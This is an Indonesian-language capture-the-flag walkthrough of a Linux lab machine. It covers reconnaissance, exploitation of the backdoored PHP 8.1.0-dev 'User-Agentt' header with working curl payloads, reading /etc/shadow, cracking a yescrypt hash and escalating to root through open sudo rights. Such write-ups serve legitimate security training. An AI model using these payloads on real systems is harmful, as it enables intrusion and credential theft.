**Dibuat oleh:** greed 
**Platform:** HackTrace **
Sistem Operasi:** Linux 
**Tingkat Kesulitan:** Easy
**Target IP:** 10.1.2.146 
**Machine Maker:** MidnightRumble

## Deskripsi Singkat

1. **Reconnaissance** → menemukan versi PHP 8.1.0-dev via `/info.php`
2. **Exploitation** → RCE melalui backdoor `zerodiumsystem()` pada header `User-Agentt`
3. **Credential Access** → membaca `/etc/shadow` dan mendapatkan hash user `sahid`
4. **Password Cracking** → hash yescrypt berhasil dipecahkan dengan John the Ripper
5. **Privilege Escalation** → konfigurasi sudoers permisif memungkinkan eskalasi langsung ke root

---

## 1. Reconnaissance

### 1.1 Port Scanning

Pemindaian port dilakukan menggunakan `rustscan` yang dikombinasikan dengan `nmap` untuk mendapatkan detail service dan versi.
```bash
rustscan -a 10.1.2.146 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2f:d8:bd:dc:75:da:69:ee:51:62:0f:9c:48:5c:92:4d (ECDSA)
|   256 46:52:44:2b:6c:b7:2f:d8:85:ed:03:9b:86:d9:8f:99 (ED25519)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
```

Hanya dua port terbuka: **22 (SSH)** dan **80 (HTTP)**. Karena SSH tidak menunjukkan kerentanan langsung tanpa kredensial, fokus investigasi diarahkan ke port 80.

### 1.2 Web Content Discovery

Enumerasi direktori/file dilakukan dengan `feroxbuster`:

```bash
feroxbuster -u http://10.1.2.146/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 -k --dont-filter \
  -x html,php,txt \
  --filter-status 404,400 \
  --redirects -o 80.txt
```

**Hasil:**

```
200      GET      857l     4457w    73554c http://10.1.2.146/info.php
200      GET        5l        9w       90c http://10.1.2.146/app/composer.json
200      GET        1l        2w       12c http://10.1.2.146/app/index.php
200      GET        8l       21w      351c http://10.1.2.146/app/
```

Ditemukan 4 endpoint utama, dengan `info.php` menjadi titik perhatian karena mengekspos halaman `phpinfo()`.

### 1.3 Analisis Endpoint

|Endpoint|Deskripsi|
|---|---|
|`/`|Halaman default nginx ("Welcome to nginx!")|
|`/info.php`|Halaman `phpinfo()` — expose informasi konfigurasi PHP secara lengkap|
|`/app/`|Directory listing, berisi `index.php` dan `composer.json`|
|`/app/index.php`|Hanya menampilkan string `"Hello World!"`|
|`/app/composer.json`|Berisi metadata composer minimal|

Isi `composer.json`:

```json
{
    "name": "sahid/belajar",
    "description": "Belajar Composer",
    "require": {}
}
```

Dari struktur ini, ditemukan clue penting: nama vendor pada composer adalah **`sahid`**, yang kemudian terbukti menjadi salah satu username valid di sistem.

Melalui `/info.php`, diketahui bahwa mesin menjalankan:

```
PHP Version: 8.1.0-dev
Server API : FPM/FastCGI
Build Date : Jul 18 2023
```

Versi **PHP 8.1.0-dev** ini adalah kunci utama untuk tahap eksploitasi berikutnya.

---

## 2. Exploitation

### 2.1 Identifikasi Kerentanan

Pencarian exploit publik menggunakan `searchsploit`:

```bash
searchsploit php8.1
```

**Hasil:**

```
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py
```

#### Latar Belakang Kerentanan

Pada Maret 2021, repository resmi PHP (`git.php.net`) berhasil diretas. Penyerang menyisipkan **backdoor** langsung ke dalam source code PHP pada beberapa commit branch development **PHP 8.1.0-dev**. Backdoor ini memungkinkan eksekusi kode arbitrer melalui HTTP header khusus.

**Mekanisme trigger:**

Backdoor dipicu melalui header HTTP bernama **`User-Agentt`** (perhatikan typo yang disengaja terdapat dua huruf 't' di akhir), dengan format value:

```
zerodiumsystem('COMMAND_HERE');
```

**Indikator kecocokan dengan mesin target:**

- ✅ Versi PHP persis **8.1.0-dev**
- ✅ Build date **Jul 18 2023** — berada dalam rentang waktu di mana image/environment dengan source code backdoored ini masih beredar
- ✅ Terverifikasi melalui public exploit script (`49933.py`), yang menunjukkan struktur request:

```python
cmd = input("$ ")
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "User-Agentt": "zerodiumsystem('" + cmd + "');"
}
```

### 2.2 Verifikasi Kerentanan (Proof of Concept)

Dilakukan pengujian command sederhana menggunakan `curl` terhadap endpoint `/info.php` (dipilih karena endpoint ini langsung memanggil `phpinfo()` tanpa logika tambahan, sehingga lebih mudah untuk membuktikan eksekusi command terjadi di awal response):

bash

```bash
curl -s 'http://10.1.2.146/info.php' \
  -H 'User-Agentt: zerodiumsystem("id");' | head -n 5
```

**Hasil:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
```

Output `uid=33(www-data)...` muncul tepat sebelum konten HTML dari `phpinfo()`, yang mengkonfirmasi bahwa **Remote Code Execution berhasil dieksekusi sebagai user `www-data`**.

### 2.3 Mendapatkan Akses Shell

Dari titik ini, RCE dapat digunakan untuk membaca file sensitif pada sistem. Pengecekan permission pada `/etc/shadow` menunjukkan bahwa file tersebut dapat dibaca melalui konteks eksekusi command ini, dan berhasil didapatkan hash password milik user **`sahid`** user yang sebelumnya teridentifikasi dari `composer.json`.

```bash
curl -s 'http://10.1.2.146/info.php' \
  -H 'User-Agentt: zerodiumsystem("cat /etc/shadow");'
```

Hash yang didapatkan:

```
sahid:$y$j9T$gz/50D/YAYpN89urKIiEK.$cEUOGekJNfOAbuCEjCFF74Nt6MR/6q7k9mYAIbSHgl5
```

Format hash `$y$` menandakan algoritma **yescrypt**, digunakan pada distribusi Ubuntu/Debian modern sebagai pengganti SHA-512 (`$6$`).

---

## 3. Password Cracking

Hash yang diperoleh disimpan ke dalam file lokal (`sahid.txt`) dan dilakukan cracking menggunakan **John the Ripper** (versi jumbo, yang mendukung format `crypt` untuk menangani algoritma modern seperti yescrypt):

```bash
john --format=crypt sahid.txt --wordlist=/home/greed/rockyou.txt
```

**Hasil cracking:**

```
sahid : projectsadminx
```

Kredensial valid berhasil didapatkan:

|Username|Password|
|---|---|
|sahid|projectsadminx|

---

## 4. Privilege Escalation

Setelah mendapatkan kredensial user `sahid`, dilakukan login menggunakan SSH:

```bash
ssh sahid@10.1.2.146
```

Pengecekan hak akses sudo:

```bash
sudo -l
```

**Hasil:**

```
Matching Defaults entries for sahid on developed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User sahid may run the following commands on developed:
    (ALL : ALL) ALL
```

User `sahid` memiliki hak akses sudo **tanpa batasan (ALL : ALL) ALL**, sehingga eskalasi ke root dapat dilakukan secara langsung:

```bash
sudo su
```

**Hasil:**

```
sahid@developed:~$ sudo su
root@developed:/home/sahid#
```

Akses **root** berhasil didapatkan.